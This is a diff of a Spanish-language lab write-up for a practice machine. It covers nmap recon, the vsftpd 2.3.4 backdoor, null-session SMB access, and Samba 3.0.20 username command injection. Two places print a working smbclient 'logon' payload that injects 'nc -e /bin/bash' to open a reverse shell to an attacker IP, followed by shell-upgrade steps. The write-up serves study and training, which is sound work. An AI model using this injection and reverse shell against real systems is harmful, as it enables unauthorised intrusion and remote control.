@@ -16,6 +16,7 @@
 ----
 
 **nmap -sV -T5 -Pn 10.10.10.3**
+
 ![Pasted image 20241114193750](../../Fotos/Pasted%20image%2020241114193750.png)
 
 Esta version del servisio vsftpd 2.3.4 es vulnerable a un backdoor y estamos revisando si con metasploit podemos generar una intrusión cosa que no logramos en este caso especifico.)
@@ -24,10 +25,12 @@ Esta version del servisio vsftpd 2.3.4 es vulnerable a un backdoor y estamos rev
 **use exploit/unix/ftp/vsftpd_234_backdoor**
 **set RHOST <IP_DEL_OBJETIVO>**
 **run**
+
 ![Pasted image 20241114193356](../../Fotos/Pasted%20image%2020241114193356.png)
 
 ----
 *Generamos intento de intrusión anonymous el cual es exitoso*
+
 ![Pasted image 20241114194644](../../Fotos/Pasted%20image%2020241114194644.png)
 
 ![Pasted image 20241114194759](../../Fotos/Pasted%20image%2020241114194759.png)
@@ -40,29 +43,39 @@ Como vemos que hay servicio samba haremos un reconocimiento
 - u user 
 - p password
 - -H host victima
+
 ![Pasted image 20241114195119](../../Fotos/Pasted%20image%2020241114195119.png)
 
 `smbclient \\\\10.10.10.3\\tmp -N`
 - Como tenemos acceso de lectura y escritura al directorio tmp intentamos tener acceeso con smbclient
 - N sesion nula, sin tener que meter credenciales
+
 ![Pasted image 20241114195309](../../Fotos/Pasted%20image%2020241114195309.png)
+
 ![Pasted image 20241114200248](../../Fotos/Pasted%20image%2020241114200248.png)
+
 No nos reporta tan cosa asique tambien lo dejaremos de lado un momento.
 
 ----
 **search exploit unix/remote/49757.py -m . **
 - trae el exploit a nuestro directorio actual y asi podemos ver como funciona por detras
+
 ![Pasted image 20241114200543](../../Fotos/Pasted%20image%2020241114200543.png)
 
 ![Pasted image 20241114201102](../../Fotos/Pasted%20image%2020241114201102.png)
+
 Recapitulamos, metasploit en este caso no va
 
 ----
+
 exploit Samba 3.0.20-Debian
+
 ![Pasted image 20241114201502](../../Fotos/Pasted%20image%2020241114201502.png)
 
 Revisamos el exploit y extraemos lo necesario para vulnerar la maquina.
+
 ![Pasted image 20241114201858](../../Fotos/Pasted%20image%2020241114201858.png)
+
 Si nosotros colocamos la sintaxis de la imagen en el username nos permite ejecutar comandos y por ende podemos hacer una reverse shell
 
 ```bash
@@ -72,9 +85,11 @@ logon
 ![Pasted image 20241114201806](../../Fotos/Pasted%20image%2020241114201806.png)
 
 ![Pasted image 20241114202435](../../Fotos/Pasted%20image%2020241114202435.png)
+
 - Esta ejecucion de comandos aparentemente se ejecuta pero no nos muetra la data del comando whoami por ejemplo sin embargo al parecer esta corriendo.
 
 Intentamos directamente con la reverse shell para ello nos ponemos en escucha por algún puerto de elección por nuestra maquina atacante.
+
 ![Pasted image 20241114202356](../../Fotos/Pasted%20image%2020241114202356.png)
 
 ```bash
@@ -90,15 +105,15 @@ logon "/=`nohup nc -e /bin/bash 10.10.14.11 1234 `"
 *Tratamiento*
 
 **script /dev/null -c bash**
+
 ![Pasted image 20241114203152](../../Fotos/Pasted%20image%2020241114203152.png)
 
 **stty raw -echo;fg**
 **export TERM=xterm**
 **reset**
+
 ![Pasted image 20241114203416](../../Fotos/Pasted%20image%2020241114203416.png)
 
----
-----
 ----
 # Otra forma de hacer la maquina
 
@@ -123,7 +138,9 @@ Cuando hacemos un escaneo con nmap y nos muestra versiones es importante tener e
 
 *Inspeccion de exploit*
 `unix/remote/16320.rb`
+
 ![Pasted image 20241114224336](../../Fotos/Pasted%20image%2020241114224336.png)
+
 ![Pasted image 20241114224404](../../Fotos/Pasted%20image%2020241114224404.png)
 
 ![Pasted image 20241114224413](../../Fotos/Pasted%20image%2020241114224413.png)
@@ -149,6 +166,7 @@ logon "/=`nohup nc -e /bin/bash 10.10.14.11 1234 `"
 ![Pasted image 20241114224920](../../Fotos/Pasted%20image%2020241114224920.png)
 
 *Tratamiento*
+
 ![Pasted image 20241114224944](../../Fotos/Pasted%20image%2020241114224944.png)
 
 ---
@@ -158,6 +176,7 @@ logon "/=`nohup nc -e /bin/bash 10.10.14.11 1234 `"
 
 Nos preguntan porque si en el escaneo de nmap muestra 4 puertos tcp abiertos si hacemos el comando netstat a la ip de la maquina victima muestra mas puertos abiertos en escucha lo cual no muestra nmap y por ende no son accesibles.
 - La respuesta es que hay una restriccion a nivel de red lo cual podria ser reglas de firewall, grupos de seguridad, software de seguridad basados en el host, configuracion de router/red local o configuracion a nivel superior.
+
 ![Pasted image 20241114204826](../../Fotos/Pasted%20image%2020241114204826.png)
 
 Puedes comprobar si hay reglas de firewall activas usando los siguientes comandos:
